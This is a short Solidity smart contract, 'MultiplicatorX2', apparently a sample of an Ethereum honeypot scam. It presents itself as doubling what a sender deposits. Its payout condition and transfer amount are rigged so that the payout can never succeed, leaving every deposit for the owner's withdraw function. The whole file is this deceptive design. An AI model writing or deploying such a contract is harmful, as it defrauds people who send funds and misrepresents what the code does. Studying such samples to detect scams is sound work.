1 pragma solidity ^0.4.18;
2 
3 contract MultiplicatorX2
4 {
5     address public Owner = msg.sender;
6    
7     function() public payable{}
8    
9     function withdraw()
10     payable
11     public
12     {
13         require(msg.sender == Owner);
14         Owner.transfer(this.balance);
15     }
16     
17     function multiplicate(address adr)
18     public
19     payable
20     {
21         if(msg.value>=this.balance)
22         {        
23             adr.transfer(this.balance+msg.value);
24         }
25     }
26 }